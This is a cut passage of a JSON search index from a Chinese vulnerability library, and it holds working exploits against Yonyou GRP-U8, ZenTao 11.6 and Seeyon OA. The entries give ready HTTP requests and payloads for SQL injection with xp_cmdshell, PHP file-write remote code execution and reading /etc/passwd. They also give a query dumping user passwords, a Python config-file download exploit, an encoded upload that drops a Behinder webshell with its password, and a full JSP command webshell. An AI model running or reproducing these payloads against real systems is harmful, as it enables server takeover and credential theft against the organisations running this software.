\u201c\u7528\u53cbGRP-u8\u201d</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E5%86%85%E6%8E%A7%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","title":"POC:","text":"<p>``` POST /Proxy HTTP/1.1 Accept: Accept: / Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host Content-Length: 357 Connection: Keep-Alive Cache-Control: no-cache</p> <p>cVer=9.8.0&amp;dp=&lt;?xml version=\"1.0\" encoding=\"GB2312\"?&gt;XMLAS_DataRequestProviderNameDataSetProviderDataDataexec xp_cmdshell 'net user'  ```\u8f93\u51famd5\u503c\uff0c\u7528\u4e8epoc\u9a8c\u8bc1\uff1a  \u4f7f\u7528MSSQL xp_cmdshell\u6267\u884c\u547d\u4ee4 </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BGRP-U8%E8%A1%8C%E6%94%BF%E4%BA%8B%E4%B8%9A%E5%86%85%E6%8E%A7%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_3","title":"\u4fee\u590d\u65b9\u6848:","text":"<p>\u8054\u7cfb\u7528\u53cb\u5b98\u65b9\u83b7\u5f97\u5b89\u5168\u5347\u7ea7\u65b9\u6848</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6RCE%E6%BC%8F%E6%B4%9E/","title":"\u7985\u905311.6RCE\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6RCE%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u8303\u56f4","text":"<p>\u7985\u9053 11.6</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6RCE%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<p>\u6587\u4ef6\u5199\u5165</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6RCE%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u8303\u56f4","text":"<p>\u7985\u9053 11.6</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6RCE%E6%BC%8F%E6%B4%9E/#poc_1","title":"\u6f0f\u6d1ePOC","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6RCE%E6%BC%8F%E6%B4%9E/#_3","title":"\u4e09.\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e","text":"<p>1\uff09\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u547d\u4ee4phpnifo()\uff1b</p> <p>Payload 1:</p> <p>http://127.0.0.1/zentaopms/www/api-getModel-editor-save-filePath=1111</p> <p>POST: fileContent=&lt;?php phpinfo(); ?&gt;</p> <p></p> <p>Payload2:</p> <p>http://127.0.0.1/zentaopms/www/ api-getModel-api-getMethod-filePath=1111/1</p> <p>POST: fileContent=&lt;?php phpinfo(); ?&gt;</p> <p></p> <pre><code>2\uff09\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u547d\u4ee4system('whoami');\n</code></pre> <p>Payload 1:</p> <p>http://127.0.0.1/zentaopms/www/api-getModel-editor-save-filePath=2222</p> <p>POST: fileContent=&lt;?php system('whoami'); ?&gt;</p> <p></p> <p>Payload 2:</p> <p>http://127.0.0.1/zentaopms/www/ api-getModel-api-getMethod-filePath=2222/2</p> <p>POST: fileContent=&lt;?php system('whoami'); ?&gt;</p> <p></p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","title":"\u7985\u905311.6\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#_1","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>\u7985\u9053 11.6</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#poc","title":"\u6f0f\u6d1ePOC","text":"<pre><code>http://127.0.0.1/zentaopms_11.6/www/api-getModel-file-parseCSV-fileName=/etc/passwd \n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/","title":"\u7985\u905311.6\u540e\u53f0SQL\u6ce8\u5165","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/#_1","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>\u7985\u9053 11.6</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%9311.6%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/#poc","title":"\u6f0f\u6d1ePOC","text":"<p>Payload:</p> <p>http://127.0.0.1/zentaopms/www/api-getModel-api-sql-sql=select+account,password+from+zt_user</p> <p></p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2%20-%209.2.1%E5%89%8D%E5%8F%B0Getshell/","title":"zentao-getshell \u7985\u90538.2 - 9.2.1\u524d\u53f0Getshell","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2%20-%209.2.1%E5%89%8D%E5%8F%B0Getshell/#python-usage","title":"Python Usage","text":"<p>\u811a\u672cgithub\u83b7\u53d6</p> <p><code>python exp.py http://127.0.0.1:81/ jas502n.php</code></p> <p></p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2%20-%209.2.1%E5%89%8D%E5%8F%B0Getshell/#_1","title":"\u6765\u6e90","text":"<p>https://github.com/jas502n/zentao-getshell</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2-9.2.1%E6%B3%A8%E5%85%A5GetShell/","title":"\u7985\u90538.2-9.2.1\u6ce8\u5165GetShell","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2-9.2.1%E6%B3%A8%E5%85%A5GetShell/#_1","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>\u7985\u90538.9-9.2.1</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%938.2-9.2.1%E6%B3%A8%E5%85%A5GetShell/#_2","title":"\u6f0f\u6d1e\u9a8c\u8bc1","text":"<p>\u8bfb\u53d6\u7248\u672c\u53f7\uff1a<code>http://********/index.php?mode=getconfig</code>\u67e5\u770b\u5fd8\u8bb0\u5bc6\u7801\u6587\u672c\u8def\u5f84\uff1a``` http://********/zentao/user-reset.html </p> <p>exp\u53ca\u4f7f\u7528\u65b9\u6cd5\uff1a \u5728\u94fe\u63a5\u4e2d\u8f93\u5165\u6784\u9020\u597d\u7684\u8bed\u53e5base64\u7f16\u7801\u540e\u5b57\u7b26\u4e32\u5373\u53ef</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","title":"\u81f4\u8fdcOA ajax.do \u672a\u6388\u6743\u6f0f\u6d1e\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_1","title":"\u7b80\u4ecb","text":"<p>\u81f4\u8fdcOA A8 \u662f\u4e00\u6b3e\u6d41\u884c\u7684\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6\uff0c\u5728\u5404\u4e2d\u3001\u5927\u578b\u4f01\u4e1a\u673a\u6784\u4e2d\u5e7f\u6cdb\u4f7f\u7528\u3002</p> <p>\u7531\u4e8e\u81f4\u8fdcOA\u65e7\u7248\u672c\u67d0\u4e9b\u63a5\u53e3\u80fd\u88ab\u672a\u6388\u6743\u8bbf\u95ee\uff0c\u5e76\u4e14\u90e8\u5206\u51fd\u6570\u5b58\u5728\u8fc7\u6ee4\u4e0d\u8db3\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e\uff0c\u53ef\u5728\u65e0\u9700\u767b\u5f55\u7684\u60c5\u51b5\u4e0b\u4e0a\u4f20\u6076\u610f\u811a\u672c\u6587\u4ef6\uff0c\u4ece\u800c\u63a7\u5236\u670d\u52a1\u5668</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>\u81f4\u8fdcOA V8.0</p> <p>\u81f4\u8fdcOA V7.1\u3001V7.1SP1</p> <p>\u81f4\u8fdcOA V7.0\u3001V7.0SP1\u3001V7.0SP2\u3001V7.0SP3</p> <p>\u81f4\u8fdcOA V6.0\u3001V6.1SP1\u3001V6.1SP2</p> <p>\u81f4\u8fdcOA V5.x</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_3","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>\u4e00\u3001\u9996\u5148\u6d4b\u8bd5\u6f0f\u6d1e\u73af\u5883\u662f\u5426\u5b58\u5728</p> <p>POC\u9a8c\u8bc1\u6f0f\u6d1e\u5b58\u5728\u5426</p> <pre><code>127.0.0.1:8002/seeyon/thirdpartyController.do.css/..;/ajax.do\n</code></pre> <p></p> <p>\u5229\u7528PAYLOAD</p> <pre><code>POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1\nHost: 127.0.0.1\nConnection: close\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: none\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nloginPageURL=; login_locale=zh_CN;\nContent-Type: application/x-www-form-urlencoded\n\nmanagerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00\n</code></pre> <p>\u5229\u7528\u6210\u529f\uff1a</p> <p> \u5229\u7528\u5931\u8d25\uff1a</p> <p></p> <p>\u51b0\u874e3 \u9ed8\u8ba4\u9a6cpass : rebeyond</p> <p>webshell\u5730\u5740: http://127.0.0.1/seeyon/SeeyouUpdate1.jspx</p> <p>\u5185\u5bb9\u6728\u9a6c\u540d\u79f0\u90fd\u53ef\u4ee5\u81ea\u4e3b\u4fee\u6539,\u53ea\u662f\u505a\u4e86gzip\u6570\u636e\u7684\u538b\u7f29\u7136\u540e\u5728\u8fdb\u884c url\u7684\u7f16\u7801</p> <p>\u63a8\u8350\u5de5\u5177</p> <p></p> <p>\u94fe\u63a5: https://pan.baidu.com/s/1tsdcmjj9G_ybFtDvGEEisA  \u5bc6\u7801: q1ns</p> <p>\u6700\u597d\u4f7f\u7528\u4f4e\u7248\u672cjava  \u4f8b\u5982\uff1aJava8</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9COA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%28CNVD-2020-62422%29/","title":"\u81f4\u8fdcOA\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e(CNVD 2020 62422)","text":"<pre><code>import requests\nimport sys\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\ndef title():\n    print('+------------------------------------------')\n    print('+  \\033[34mPOC_Des: http://wiki.peiqi.tech                                   \\033[0m')\n    print('+  \\033[34mVersion: Laravel framework &lt;= 5.5.21                              \\033[0m')\n    print('+  \\033[36m\u4f7f\u7528\u683c\u5f0f:  python3 poc.py                                            \\033[0m')\n    print('+  \\033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \\033[0m')\n    print('+------------------------------------------')\n\ndef POC_1(target_url):\n    vuln_url = target_url + \"/seeyon/webmail.do?method=doDownloadAtt&amp;filename=PeiQi.txt&amp;filePath=../conf/datasourceCtp.properties\"\n    headers = {\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\",\n    }\n    try:\n        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)\n        if \"workflow\" in response.text:\n            print(\"\\033[32m[o] \u76ee\u6807{}\u5b58\u5728\u6f0f\u6d1e \\033[0m\".format(target_url))\n            print(\"\\033[32m[o] \u54cd\u5e94\u4e3a:\\n{} \\033[0m\".format(response.text))\n        else:\n            print(\"\\033[31m[x] \u6587\u4ef6\u8bf7\u6c42\u5931\u8d25 \\033[0m\")\n            sys.exit(0)\n    except Exception as e:\n        print(\"\\033[31m[x] \u8bf7\u6c42\u5931\u8d25 \\033[0m\", e)\n\nif __name__ == '__main__':\n    title()\n    target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl &gt;&gt;&gt; \\033[0m\"))\n    POC_1(target_url)\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9COA%E7%B3%BB%E7%BB%9F%E5%A4%9A%E7%89%88%E6%9C%ACGetshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","title":"\u81f4\u8fdcOA\u7cfb\u7edf\u591a\u7248\u672cGetshell\u6f0f\u6d1e\u590d\u73b0","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9COA%E7%B3%BB%E7%BB%9F%E5%A4%9A%E7%89%88%E6%9C%ACGetshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#_1","title":"\u5f71\u54cd\u7248\u672c","text":"<p>\u81f4\u8fdcA8-V5\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V6.1sp1 \u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6V7.0\u3001V7.0sp1\u3001V7.0sp2\u3001V7.0sp3 \u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6V7.1</p> <p>\u5229\u7528\u524d\u63d0 \u8bbf\u95ee/seeyon/htmlofficeservlet\u51fa\u73b0 <code>DBSTEP V3.0 0 21 0 htmoffice operate err</code></p> <p>POC</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9COA%E7%B3%BB%E7%BB%9F%E5%A4%9A%E7%89%88%E6%9C%ACGetshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#_2","title":"\u8bf7\u6c42\u5305","text":"<pre><code>POST /seeyon/htmlofficeservlet HTTP/1.1\n\n  Content-Length: 1121\n\n  User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\n\n  Host: xxxxxxxxx\n\n  Pragma: no-cache\n\n  DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV\n\n  OPTION=S3WYOSWLBSGr\n\n  currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\n\n  CREATEDATE=wUghPB3szB3Xwg66\n\n  RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\n\n  originalFileId=wV66\n\n  originalCreateDate=wUghPB3szB3Xwg66\n\n  FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6\n\n  needReadFile=yRWZdAS6\n\n  originalCreateDate=wLSGP4oEzLKAz4=iz=66\n\n  &lt;%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%&gt;&lt;%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+\"\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %&gt;&lt;%if(\"asasd3344\".equals(request.getParameter(\"pwd\"))&amp;&amp;!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"&lt;pre&gt;\"+excuteCmd(request.getParameter(\"cmd\")) + \"&lt;/pre&gt;\");}else{out.println(\":-)\");}%&gt;6e4f045d4b8506bf492ada7e3390d7ce \n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9COA%E7%B3%BB%E7%BB%9F%E5%A4%9A%E7%89%88%E6%9C%ACGetshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/#_3","title":"\u54cd\u5e94\u5305","text":"<pre><code>DBSTEP V3.0 386 0 666 DBSTEP=OKMLlKlV\n\n  OPTION=S3WYOSWLBSGr\n\n  currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\n\n  CREATEDATE=wUghPB3szB3Xwg66\n\n  RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\n\n  originalFileId=wV66\n\n  originalCreateDate=wUghPB3szB3Xwg66\n\n  FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6\n\n  needReadFile=yRWZdAS6\n\n  originalCreateDate=wLSGP4oEzLKAz4=iz=66\n\n  